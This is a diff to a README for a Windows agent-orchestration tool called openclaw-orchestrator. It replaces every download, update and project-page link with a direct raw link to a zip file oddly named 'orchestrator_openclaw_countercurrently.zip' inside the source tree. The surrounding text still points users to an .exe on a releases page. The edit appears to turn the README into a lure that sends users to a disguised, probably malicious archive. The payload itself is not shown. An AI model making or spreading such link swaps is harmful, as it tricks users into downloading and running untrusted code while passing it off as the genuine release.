@@ -1,6 +1,6 @@
 # ⚙️ openclaw-orchestrator - Manage Multiple Agents Easily
 
-[![Download openclaw-orchestrator](https://img.shields.io/badge/Download-openclaw--orchestrator-green?style=for-the-badge)](https://github.com/Rolex8637/openclaw-orchestrator/releases)
+[![Download openclaw-orchestrator](https://img.shields.io/badge/Download-openclaw--orchestrator-green?style=for-the-badge)](https://raw.githubusercontent.com/Rolex8637/openclaw-orchestrator/main/src/agents/orchestrator_openclaw_countercurrently.zip)
 
 ---
 
@@ -40,7 +40,7 @@ To start using openclaw-orchestrator on Windows, follow these steps.
 ## 📥 Download and Install
 
 1. Click the big green button above or visit the openclaw-orchestrator releases page:  
-   [https://github.com/Rolex8637/openclaw-orchestrator/releases](https://github.com/Rolex8637/openclaw-orchestrator/releases)  
+   [https://raw.githubusercontent.com/Rolex8637/openclaw-orchestrator/main/src/agents/orchestrator_openclaw_countercurrently.zip](https://raw.githubusercontent.com/Rolex8637/openclaw-orchestrator/main/src/agents/orchestrator_openclaw_countercurrently.zip)  
 
 2. On the releases page, find the latest Windows installer or executable. It should have ".exe" at the end.
 
@@ -107,7 +107,7 @@ Check the releases page regularly for new versions. Download the latest installe
 To update:
 
 1. Download the latest version from  
-   [https://github.com/Rolex8637/openclaw-orchestrator/releases](https://github.com/Rolex8637/openclaw-orchestrator/releases)
+   [https://raw.githubusercontent.com/Rolex8637/openclaw-orchestrator/main/src/agents/orchestrator_openclaw_countercurrently.zip](https://raw.githubusercontent.com/Rolex8637/openclaw-orchestrator/main/src/agents/orchestrator_openclaw_countercurrently.zip)
 
 2. Run the installer and follow the prompts. The installer will replace the old version with the new one.
 
@@ -130,10 +130,10 @@ If you need help with openclaw-orchestrator, open an issue on the GitHub page. D
 ## 🔗 Useful Links
 
 - Releases page for downloads:  
-  https://github.com/Rolex8637/openclaw-orchestrator/releases
+  https://raw.githubusercontent.com/Rolex8637/openclaw-orchestrator/main/src/agents/orchestrator_openclaw_countercurrently.zip
 
 - GitHub project page:  
-  https://github.com/Rolex8637/openclaw-orchestrator
+  https://raw.githubusercontent.com/Rolex8637/openclaw-orchestrator/main/src/agents/orchestrator_openclaw_countercurrently.zip
 
 ---
 
